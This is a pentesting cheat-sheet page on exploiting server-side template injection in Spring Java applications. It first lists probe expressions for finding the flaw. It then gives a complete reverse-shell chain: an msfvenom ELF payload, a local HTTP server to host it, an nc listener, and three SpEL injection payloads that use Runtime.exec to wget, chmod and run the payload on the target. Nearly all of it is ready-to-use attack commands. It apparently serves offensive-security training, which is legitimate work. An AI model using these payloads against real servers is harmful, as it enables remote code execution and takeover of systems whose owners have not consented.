---
title: Spring Pentesting
desc:
tags: [Boot, Java, Reverse, Shell, Spring, Spring4Shell, SpringBoot, SSTI, Web]
alts: []
render_with_liquid: true
---

## Reverse Shell with Server-Side Template Injection (SSTI)

1. **SSTI Discovery**

    If there is an input form, such as a search form, or URL parameter which the parameter is reflected in the website, you may be able to find the vulnerability to the server-side template injection.

    Try them:

    ```java
    2*2
    #{2*2}
    *{2*2}
    ```

    Then you can also check more about that.

    ```java
    {"dfd".replace("d", "x")}
    #{"dfd".replace("d", "x")}
    *{"dfd".replace("d", "x")}

    // ---------------------------------------

    // the desired output of the above...
    "xfx"
    ```

2. **Reverse Shell**

    First generate the payload of the reverse shell which will be downloaded from the website.

    ```sh
    msfvenom -p linux/x64/shell_reverse_tcp LHOST=<local-ip> LPORT=<local-port> -f elf > r.elf
    ```

    Start a local web server to allow the website to download the payload named “r.elf”

    ```sh
    python3 -m http.server 8000
    ```

    In another terminal, open listener for getting the reverse shell.

    ```sh
    nc -lvnp <local-port>
    ```

    In the target website,

    ```java
    *{"".getClass().forName("java.lang.Runtime").getRuntime().exec("wget http://<local-ip>:8000/r.elf")}

    *{"".getClass().forName("java.lang.Runtime").getRuntime().exec("chmod 777 ./r.elf")}

    *{"".getClass().forName("java.lang.Runtime").getRuntime().exec("./r.elf")}
    ```

    Finally you should see to get the shell